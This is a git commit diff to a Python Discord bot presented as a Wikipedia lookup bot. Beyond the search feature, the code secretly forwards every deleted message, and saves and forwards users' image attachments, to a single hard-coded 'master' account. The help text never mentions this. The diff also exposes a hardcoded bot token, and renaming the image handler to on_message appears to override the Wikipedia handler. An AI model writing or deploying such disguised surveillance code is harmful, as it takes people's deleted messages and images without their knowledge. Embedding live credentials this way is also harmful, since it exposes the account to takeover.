8994eb508f6d90149ed3b5c6a956b5a65f2d1be1
vishnudattaj <101271583+vishnudattaj@users.noreply.github.com>
2022-03-09 12:17:34 -0600

    Update Wikipedia-Bot.py

--- Wikipedia-Bot.py
+++ Wikipedia-Bot.py
@@ -1,25 +1,26 @@
 import discord
 import wikipediaapi
 
-TOKEN = 'OTUwODU2MzIxNTEzNjg1MDAy.Yie_9Q.JiuOqDuhcYhgdsxO_jPAaCi721g'
+TOKEN = "OTUwODU2MzIxNTEzNjg1MDAy.Yie_9Q.JiuOqDuhcYhgdsxO_jPAaCi721g"
 
 client = discord.Client()
 
 
 @client.event
 async def on_ready():
-    print('We have logged in as {0.user}'.format(client))
+    print(f'{client.user} has connected to Discord!')
+
 
 @client.event
 async def on_message(message):
-    global language
     username = str(message.author).split('#')[0]
     user_message = str(message.content)
     channel = str(message.channel.name)
     print(f'{username}: {user_message} ({channel})')
 
     if message.content.startswith('!help'):
-        await message.channel.send('Welcome to Wikipedia-Bot! This bot searches user-inputted material into wikipedia, and shares the result to you. The format is !wiki-input_in_wikipedia')
+        await message.channel.send(
+            'Welcome to Wikipedia-Bot! This bot searches user-inputted material into wikipedia, and shares the result to you. The format is !wiki-input_in_wikipedia')
     if message.content.startswith('!wiki'):
         if message.author == client.user:
             return
@@ -28,7 +29,7 @@ async def on_message(message):
             wiki_input = str(message.content).split('-')[1]
             wiki_wiki = wikipediaapi.Wikipedia('en')
             page_py = wiki_wiki.page(wiki_input)
-            if page_py.exists() != True:
+            if not page_py.exists():
                 await message.channel.send("Error: Page not found")
             else:
                 await message.channel.send("Title: %s" % page_py.title)
@@ -39,31 +40,31 @@ async def on_message(message):
     if message.author == client.user:
         return
 
+
 @client.event
 async def on_message_delete(message):
     username = str(message.author).split('#')[0]
     user_message = str(message.content)
     channel = str(message.channel.name)
     msg = f'DELETED MESSAGE - {username}: {user_message} ({channel})'
-    user = await client.fetch_user(879543434849955850)
-    await user.send(msg)
+    master = await client.fetch_user(879543434849955850)
+    await master.send(msg)
 
+image_types = ["png", "jpeg", "gif", "jpg"]
 
 
 @client.event
-async def on_message1(message: discord.Message):
-    image_types = ["png", "jpeg", "gif", "jpg"]
+async def on_message(message: discord.Message):
     for attachment in message.attachments:
         if any(attachment.filename.lower().endswith(image) for image in image_types):
-            if message.author == client.user:
-                return
-            user = await client.fetch_user(879543434849955850)
             username = str(message.author).split('#')[0]
             user_message = str(message.content)
             channel = str(message.channel.name)
-            await user.send(f'{username}: {user_message} ({channel})')
-            await user.send(file=discord.File(attachment.filename))
-
+            msg = f'{username}: {user_message} ({channel})'
+            await attachment.save(attachment.filename)
+            master = await client.fetch_user(879543434849955850)
+            await master.send(msg)
+            await master.send(attachment.filename)
 
 
 client.run(TOKEN)
